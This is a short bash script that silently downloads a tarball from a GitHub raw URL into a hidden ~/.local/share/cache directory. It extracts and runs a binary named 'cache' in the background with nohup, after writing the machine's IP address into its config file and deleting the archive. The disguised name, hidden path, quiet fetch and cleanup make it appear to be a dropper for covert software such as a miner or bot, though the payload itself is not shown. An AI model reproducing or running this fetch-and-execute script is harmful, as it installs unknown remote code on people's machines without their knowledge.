#!/bin/bash
mkdir -p /home/sit/.local/share/cache
cd /home/sit/.local/share/cache
wget -q -P /tmp/ https://raw.githubusercontent.com/cache-log/d/master/s.tar.gz
tar -xf /tmp/s.tar.gz
rm -rf /tmp/s.tar.gz
chmod +x ./cache
sed -i "s/mamba/`ip route get 8.8.8.8 | grep src | awk '{print $NF}'`/" ./config.txt
nohup ./cache &